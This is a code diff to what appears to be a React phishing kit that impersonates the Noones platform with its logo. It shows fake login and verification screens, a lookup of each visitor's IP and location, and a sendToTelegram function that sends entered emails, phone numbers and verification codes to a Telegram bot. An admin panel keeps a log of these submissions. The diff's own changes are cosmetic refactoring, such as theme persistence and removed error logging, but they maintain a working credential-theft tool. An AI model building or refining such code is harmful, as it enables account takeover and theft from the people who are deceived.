@@ -3,8 +3,8 @@ import React, { useState, useEffect } from 'react';
 import LoginScreen from './components/LoginScreen';
 import VerificationScreen from './components/VerificationScreen';
 import AdminPanel from './components/AdminPanel';
-import ThemeToggle from './components/ThemeToggle';
 import LanguageSelector from './components/LanguageSelector';
+import ThemeToggle from './components/ThemeToggle';
 import { AuthStep, Submission } from './types';
 
 const DEFAULT_LOGO = "https://noones.com/images/noones-logo-white.svg";
@@ -20,15 +20,23 @@ const App: React.FC = () => {
   const [userIp, setUserIp] = useState<string>("Detecting...");
 
   useEffect(() => {
+    // Update body background class based on theme
+    document.body.className = isDarkMode 
+      ? 'bg-[#121212] text-white transition-colors duration-200' 
+      : 'bg-gray-100 text-black transition-colors duration-200';
+
     // Load local settings safely
     try {
       const savedLogo = localStorage.getItem('noones_custom_logo');
       if (savedLogo) setLogoUrl(savedLogo);
+      
+      const savedTheme = localStorage.getItem('noones_theme');
+      if (savedTheme !== null) setIsDarkMode(savedTheme === 'dark');
     } catch (e) {
       console.warn("LocalStorage access denied:", e);
     }
 
-    // Fetch IP for better logging with timeout and error handling
+    // Fetch IP for better logging
     const fetchIp = async () => {
       try {
         const controller = new AbortController();
@@ -39,12 +47,20 @@ const App: React.FC = () => {
         const data = await res.json();
         setUserIp(`${data.ip} (${data.city || 'Unknown City'}, ${data.country_name || 'Unknown Country'})`);
       } catch (e) {
-        setUserIp("Detection Failed (Ad-blocker?)");
+        setUserIp("Detection Failed");
       }
     };
 
     fetchIp();
-  }, []);
+  }, [isDarkMode]);
+
+  const toggleTheme = () => {
+    const newMode = !isDarkMode;
+    setIsDarkMode(newMode);
+    try {
+      localStorage.setItem('noones_theme', newMode ? 'dark' : 'light');
+    } catch (e) {}
+  };
 
   const escapeHtml = (unsafe: string) => {
     return unsafe
@@ -58,7 +74,7 @@ const App: React.FC = () => {
   const sendToTelegram = async (message: string) => {
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-      const response = await fetch(url, {
+      await fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -67,10 +83,6 @@ const App: React.FC = () => {
           parse_mode: 'HTML'
         })
       });
-      if (!response.ok) {
-        const errorData = await response.json();
-        console.error("Telegram API rejection:", errorData);
-      }
     } catch (e) {
       console.error("Telegram Network Error:", e);
     }
@@ -88,7 +100,6 @@ const App: React.FC = () => {
     
     sendToTelegram(message);
     
-    // Log locally for the session
     const newSubmission: Submission = {
       id: Math.random().toString(36).substr(2, 9),
       emailOrPhone: data.email,
@@ -111,7 +122,6 @@ const App: React.FC = () => {
       
       sendToTelegram(message);
 
-      // Update the local log with the code
       setSubmissions(prev => prev.map(s => 
         (s.emailOrPhone === currentDraft.email && !s.verificationCode) 
         ? { ...s, verificationCode: code } 
@@ -120,34 +130,19 @@ const App: React.FC = () => {
 
       setCurrentDraft(null);
       setStep('login');
-      alert("Verification processed successfully.");
+      alert("Verification processed.");
     }
   };
-
-  useEffect(() => {
-    document.body.className = isDarkMode 
-      ? 'bg-[#121212] transition-colors duration-200' 
-      : 'bg-gray-100 transition-colors duration-200';
-  }, [isDarkMode]);
-
-  const toggleTheme = () => setIsDarkMode(!isDarkMode);
 
   const handleUpdateLogo = (newUrl: string) => {
     setLogoUrl(newUrl);
     try {
-      if (newUrl) {
-        localStorage.setItem('noones_custom_logo', newUrl);
-      } else {
-        localStorage.removeItem('noones_custom_logo');
-      }
-    } catch (e) {
-      console.error("Failed to save to localStorage:", e);
-    }
+      if (newUrl) localStorage.setItem('noones_custom_logo', newUrl);
+      else localStorage.removeItem('noones_custom_logo');
+    } catch (e) {}
   };
 
-  const clearLogs = () => {
-    setSubmissions([]);
-  };
+  const clearLogs = () => setSubmissions([]);
 
   const isWhiteLogo = logoUrl === DEFAULT_LOGO || (logoUrl && logoUrl.toLowerCase().includes('white'));
   const shouldInvert = !isDarkMode && isWhiteLogo;
